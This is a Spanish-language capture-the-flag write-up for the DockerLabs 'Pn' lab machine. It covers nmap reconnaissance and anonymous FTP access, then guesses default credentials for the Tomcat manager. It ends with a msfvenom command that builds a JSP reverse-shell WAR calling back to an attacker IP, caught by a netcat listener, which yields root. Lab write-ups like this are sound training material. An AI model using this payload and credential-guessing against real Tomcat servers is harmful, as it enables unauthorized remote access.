# Máquina -Pn


Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack
8080/tcp open  http-proxy syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
8080/tcp open  http    Apache Tomcat 9.0.88
|_http-title: Apache Tomcat/9.0.88
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
```

Nos reporta que esta habilitado el login para**Anonymous** en el servicio **ftp**.

```shell
ftp 172.17.0.2
anonymous
---------------------
230 Login successful.
ftp> 
```

```shell
ls
------------
-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
```

Nos descargamos el **.txt** que hay con **get**:

```shell
get tomcat.txt
quit
cat tomcat.txt
---------------------------
Hello tomcat, can you configure the tomcat server? I lost the password...
```

Es posible que **tomcat** sea el usuario que necesitaremos en el servicio que corre por el puerto **8080**.

--------------
## Explotación

Al hacer click en "**manager webapp**" nos aparece un panel de login en el navegador para poder acceder.

![Pasted image 20240419200751](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/925ef76e-65ea-48fb-b7dc-9717450b6804)

Probamos contraseñas por defecto para **tomcat**:

```
admin:admin
tomcat:tomcat
admin:
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

Las credenciales **tomcat:s3cr3t** nos dan resultado

Logramos acceder al panel de administración de **tomcat**. Ahora tenemos que conseguir acceso a la máquina, y lo podemos hacer mediante un paquete "**.war**" malicioso. Que nos devolverá una **Reverse shell**. Lo crearemos fácilmente con **msfvenom**:

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o RevShell.war
```

Siendo la 172.17.0.1 la IP de nuestra máquina atacante y 443 el puerto que abriremos.
Nos ponemos en escucha con **netcat**:

```shell
sudo nc -nlvp 443
```

En el panel de administración, vamos al apartado **WAR file to deploy**, seleccionamos nuestra **RevShell.war** y la subimos..

![Pasted image 20240419195659](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/45f33359-5bbc-40ec-8a3a-95927315ddc6)

Hacemos click en el nuevo paquete que ya nos aparece arriba y nos devuelve la conexión a nuestra máquina atacante.

![Pasted image 20240419195923](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/691173fa-5721-4927-8497-b6c9e420d1b4)

Estamos dentro !

Y además como el usuario que corre el servicio es root, hemos logrado el nivel de privilegios máximo !

```shell
whoami
----------------
root
```
